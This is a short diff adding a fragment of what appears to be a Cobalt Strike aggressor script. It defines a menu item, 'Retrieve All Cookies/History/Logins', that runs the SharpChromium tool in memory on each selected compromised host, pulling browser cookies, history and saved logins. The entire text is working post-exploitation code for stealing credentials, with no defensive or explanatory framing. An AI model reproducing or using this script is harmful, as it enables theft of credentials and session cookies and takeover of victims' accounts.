@@ -1,0 +1,10 @@
+item "Retrieve All Cookies/History/Logins"{
+			local('$bid');
+				foreach $bid ($1){
+					sharpchromeall($bid);
+				}
+			}
+			
+sub sharpchromeall{
+bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "all");
+}			
